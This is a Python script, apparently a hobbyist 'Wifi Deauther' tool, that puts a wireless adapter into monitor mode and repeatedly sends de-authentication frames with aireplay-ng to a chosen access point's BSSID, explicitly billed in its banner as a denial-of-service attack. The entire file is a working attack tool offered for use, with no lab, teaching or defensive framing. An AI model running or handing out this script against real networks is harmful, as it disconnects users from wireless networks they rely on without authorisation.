

import subprocess
import time
import argparse

banner = r"""
---------------------------------------------------------------- 
|-|----------------------------------------------------------|-|
(~|        ____  _________   __  __________  ____________    |~)
|~)       / __ \/ ____/   | / / / /_  __/ / / / ____/ __ \   (~|
(~|      / / / / __/ / /| |/ / / / / / / /_/ / __/ / /_/ /   |~)
|~)     / /_/ / /___/ ___ / /_/ / / / / __  / /___/ _, _/    (~|
(~|    /_____/_____/_/  |_\____/ /_/ /_/ /_/_____/_/ |_|     |~)
|~)                                                          (~|
|-|----------------------------------------------------------|-| 
(~|  Wifi access point (AP) De-authenticate (DOS)            |~)
|-|----------------------------------------------------------|-|
|~)     Created by: Ibrahim-Ajimati                          (~|
----------------------------------------------------------------
[~|                 A.K.A f3ar_0f_th3_unkn0wn @github        |~]
----------------------------------------------------------------
                          +---------+         -----
                         +-----------+        |   |
                        +-------------+       -----
=================================================================
=================================================================
"""

print(banner)


# parse argument
parser = argparse.ArgumentParser(prog="Wifi Deauther",
                                 description="Wifi De-authenticate program",
                                 epilog="Example Usage: (wifi-deauth.py -i wlan0 -c 11 -b AA:BB:CC:DD:EE:FF -p 50)")
parser.add_argument("-i", "--interface", help="Wireless Interface", required=True)
parser.add_argument("-b", "--bssid", help="Target access point(AP) BSSID", required=True)
parser.add_argument("-c", "--channel", help="Target access point(AP) channel", required=True)
parser.add_argument("-p", "--packet", help="Number of packets sent to access point(AP)", required=True)
args = parser.parse_args()

# specify the wireless interface
wifi_adapter = args.interface

target_bssid = args.bssid

target_channel = args.channel

# set the number of deauth packet
num_packets = int(args.packet)

# set the delay between sending of packet (in seconds)
delay = 0.1

try:
    # Kill all interfering process
    subprocess.run(["airmon-ng", "check", "kill"], check=True)

    # put interface in monitor mode
    subprocess.run(["airmon-ng", "start", wifi_adapter], check=True)

    # set channel of the interface
    subprocess.run(["iwconfig", wifi_adapter, "channel", str(target_channel)], check=True)

    print("-----------------------------------------------------------------")

    # Deauthenticate the target AP
    for i in range(num_packets):
        subprocess.run(["aireplay-ng", "--deauth", "1", "-a", target_bssid, "--ignore-negative-one", wifi_adapter], check=True)
        time.sleep(delay)

    print("-----------------------------------------------------------------")

    # take interface out of monitor mode
    subprocess.run(["airmon-ng", "stop", wifi_adapter], check=True)

    print("-----------------------------------------------------------------")

    # restart network connectivity
    subprocess.run(["service", "NetworkManager", "start"], check=True)
    subprocess.run(["service", "wpa_supplicant", "start"], check=True)

except KeyboardInterrupt:
    print("""
    -----------------------------------
    |-|-----------------------------|-|
    |~| Program Aborting.. (Ctrl+c) |~|
    |-|-----------------------------|-|
    -----------------------------------""")

    # restart network connectivity
    subprocess.run(["service", "NetworkManager", "start"], check=True)
    subprocess.run(["service", "wpa_supplicant", "start"], check=True)
    # end program
    quit()
